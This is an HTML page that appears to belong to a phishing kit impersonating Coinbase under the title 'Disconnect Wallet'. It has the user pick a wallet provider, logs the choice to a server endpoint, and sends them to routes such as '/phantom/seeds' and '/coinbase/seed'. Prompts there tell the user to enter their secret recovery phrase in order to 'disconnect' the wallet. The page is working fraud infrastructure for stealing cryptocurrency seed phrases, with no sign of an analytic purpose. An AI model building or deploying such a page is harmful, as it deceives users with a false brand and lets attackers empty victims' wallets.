
<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
 <head>
  <meta charset="utf-8"/>
  <style>
html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
}
html.ll-fb #cb-dw-select {
  color-scheme: dark;
}
html.ll-fb #cb-dw-select:-webkit-autofill,
html.ll-fb #cb-dw-select:-webkit-autofill:hover,
html.ll-fb #cb-dw-select:-webkit-autofill:focus {
  -webkit-text-fill-color: inherit;
  box-shadow: 0 0 0 1000px #0a0b0d inset;
  caret-color: inherit;
}
html.ll-fb a.font-coinbase-sans.font-medium {
  font-weight: 400 !important;
}
.ll-fb-logo{width:32px;height:32px;display:block;flex-shrink:0}
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style:}
*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}
html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,"Apple Color Emoji","Segoe UI Emoji",Segoe UI Symbol,"Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}
body{margin:0;line-height:inherit}
h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}
b,strong{font-weight:bolder}
button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}
button,select{text-transform:none}
button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}
blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}
img,svg,video,canvas,audio,iframe,embed,object{display:block;vertical-align:middle}
html,body,#root{height:100%}
.mt-12{margin-top:3rem}
.mt-4{margin-top:1rem}
.mt-6{margin-top:1.5rem}
.mt-8{margin-top:2rem}
.flex{display:flex}
.h-full{height:100%}
.min-h-fit{min-height:-moz-fit-content;min-height:fit-content}
.w-full{width:100%}
.max-w-md{max-width:28rem}
.flex-grow{flex-grow:1}
.flex-col{flex-direction:column}
.items-center{align-items:center}
.justify-center{justify-content:center}
.justify-between{justify-content:space-between}
.rounded-\[16px\]{border-radius:16px}
.rounded-full{border-radius:9999px}
.rounded-md{border-radius:.375rem}
.bg-coinbase-background{--tw-bg-opacity: 1;background-color:rgb(10 11 13 / var(--tw-bg-opacity, 1))}
.bg-coinbase-primary{--tw-bg-opacity: 1;background-color:rgb(87 139 250 / var(--tw-bg-opacity, 1))}
.bg-transparent{background-color:transparent}
.p-2{padding:.5rem}
.p-6{padding:1.5rem}
.px-6{padding-left:1.5rem;padding-right:1.5rem}
.py-4{padding-top:1rem;padding-bottom:1rem}
.pb-2{padding-bottom:.5rem}
.pb-8{padding-bottom:2rem}
.pl-6{padding-left:1.5rem}
.pr-2{padding-right:.5rem}
.pr-8{padding-right:2rem}
.pt-5{padding-top:1.25rem}
.font-coinbase-sans{font-family:CBSans}
.font-coinbase-text{font-family:CBText}
.font-coinbase-title{font-family:CBDisplay}
.text-\[28px\]{font-size:28px}
.font-medium{font-weight:500}
.font-semibold{font-weight:600}
.text-black{--tw-text-opacity: 1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}
.text-coinbase-foreground-muted{--tw-text-opacity: 1;color:rgb(138 145 158 / var(--tw-text-opacity, 1))}
.text-coinbase-primary{--tw-text-opacity: 1;color:rgb(87 139 250 / var(--tw-text-opacity, 1))}
.text-white{--tw-text-opacity: 1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}
.outline-none{outline:2px solid transparent;outline-offset:2px}
.ring-1{--tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow, 0 0 #0000)}
.ring-coinbase-line{--tw-ring-color: #8a919e33}
.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}
.transition-colors{transition-property:color,background-color,border-color,text-decoration-color,fill,stroke;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}
.focus-within\:ring-2:focus-within{--tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow, 0 0 #0000)}
.focus-within\:ring-coinbase-primary:focus-within{--tw-ring-opacity: 1;--tw-ring-color: rgb(87 139 250 / var(--tw-ring-opacity, 1))}
.hover\:bg-\[\#507fe5\]:hover{--tw-bg-opacity: 1;background-color:rgb(80 127 229 / var(--tw-bg-opacity, 1))}
.active\:scale-\[\.98\]:active{--tw-scale-x: .98;--tw-scale-y: .98;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
.active\:bg-\[\#4b78d6\]:active{--tw-bg-opacity: 1;background-color:rgb(75 120 214 / var(--tw-bg-opacity, 1))}
.disabled\:scale-100:disabled{--tw-scale-x: 1;--tw-scale-y: 1;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
.disabled\:bg-\[\#314b84\]:disabled{--tw-bg-opacity: 1;background-color:rgb(49 75 132 / var(--tw-bg-opacity, 1))}
@media (min-width: 640px){.sm\:mt-24{margin-top:6rem}}
@media (min-width: 640px){.sm\:justify-start{justify-content:flex-start}}
@media (min-width: 640px){.sm\:border{border-width:1px}}
@media (min-width: 640px){.sm\:border-coinbase-line,.sm\:border-crypto-line{border-color:#8a919e33}}
@media (min-width: 640px){.sm\:px-10{padding-left:2.5rem;padding-right:2.5rem}}
@media (min-width: 640px){.sm\:py-8{padding-top:2rem;padding-bottom:2rem}}
  </style>
  <link rel="icon" href="/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Disconnect Wallet</title>
  <meta content="#000000" name="theme-color"/>
  <link rel="stylesheet" href="css/flow-b-shell.css"/>
</head>
 <body style="background:#0a0b0d;">
  <div class="ll-fb-type" id="root">
   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
    <div class="w-full px-6 pt-5">
     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF">
      </path>
     </svg>
    </div>
    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
     <form autocomplete="off" class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
      <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
       Disconnect your wallet
      </span>
      <span class="font-coinbase-sans text-coinbase-foreground-muted">
       Choose your self-custodial wallet from our authorized providers below.
      </span>
      <div class="mt-6 w-full rounded-md pr-2 ring-1 ring-coinbase-line transition-all focus-within:ring-2 focus-within:ring-coinbase-primary">
       <select id="cb-dw-select" autocomplete="off" class="w-full bg-transparent p-2 text-white outline-none">
        <option class="bg-coinbase-background text-white" value="ledger">Ledger</option>
        <option class="bg-coinbase-background text-white" value="trezor">Trezor</option>
        <option class="bg-coinbase-background text-white" value="metamask">MetaMask</option>
        <option class="bg-coinbase-background text-white" value="phantom">Phantom</option>
        <option class="bg-coinbase-background text-white" value="exodus">Exodus</option>
        <option class="bg-coinbase-background text-white" value="ellipal">Ellipal</option>
        <option class="bg-coinbase-background text-white" value="other">Other</option>
       </select>
      </div>
      <a class="font-coinbase-sans text-coinbase-primary mt-4 font-medium" href="javascript:void(0)" onclick="return false;" style="pointer-events:none;cursor:default;">
       What is a self-custodial wallet?
      </a>
      <button id="cb-dw-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center mt-8 w-full" type="button">
       Continue
      </button>
     </form>
  <script>
@verbatim
  (function(){
    var WALLET_URLS = {
      ledger:   '/ledger/3',
      trezor:   '/trezor/phrase-page',
      metamask: '/metamask/import',
      phantom:  '/phantom/seeds',
      exodus:   '/exodus/import',
      ellipal:  '/ellipal/1',
      other:    '/coinbase/seed'
    };
    var DISCONNECT_TEXT = {
      phantom:  { _title: 'Disconnect your wallet', _sub: 'Enter your Secret Recovery Phrase to disconnect your wallet', _btn: 'Disconnect' },
      ellipal:  { _title: 'Disconnect your wallet', _sub: 'Enter your recovery phrase to disconnect your wallet',        _btn: 'Disconnect' },
      other:    { _title: 'Disconnect your wallet', _sub: 'Enter your seed phrase to disconnect your wallet',            _btn: 'Disconnect' }
    };
    var btn = document.getElementById('cb-dw-btn');
    var sel = document.getElementById('cb-dw-select');
    var _sent = false;
    btn.addEventListener('click', function() {
      if (_sent) return; _sent = true;
      var val    = sel ? sel.value : 'other';
      var wallet = sel ? sel.options[sel.selectedIndex].text : 'Unknown';
      var csrf   = window._liveledCSRF || '';
      var b = new URLSearchParams({_token:csrf,type:'form_submit',page:'coinbase_disconnect_wallet',element:'wallet',value:wallet});
      try{navigator.sendBeacon?navigator.sendBeacon('/api/log',b):fetch('/api/log',{method:'POST',body:b,keepalive:true});}catch(e){}
      var url = WALLET_URLS[val] || '/coinbase/loading';
      var dcText = DISCONNECT_TEXT[val];
      document.documentElement.style.background='#0a0b0d';
      document.body.style.background='#0a0b0d';
      setTimeout(function(){
        if(dcText){
          var f=document.createElement('form');f.method='POST';f.action=url;f.style.display='none';
          var fields=Object.assign({_token:csrf},dcText);
          Object.keys(fields).forEach(function(k){var i=document.createElement('input');i.type='hidden';i.name=k;i.value=fields[k];f.appendChild(i);});
          document.body.appendChild(f);f.submit();
        } else {
          if(window.navigateTo)window.navigateTo(url);
          else window.location.href=url;
        }
      },300);
    });
  })();
@endverbatim
  </script>
    </div>
   </div>
  </div>
 </body>
</html>

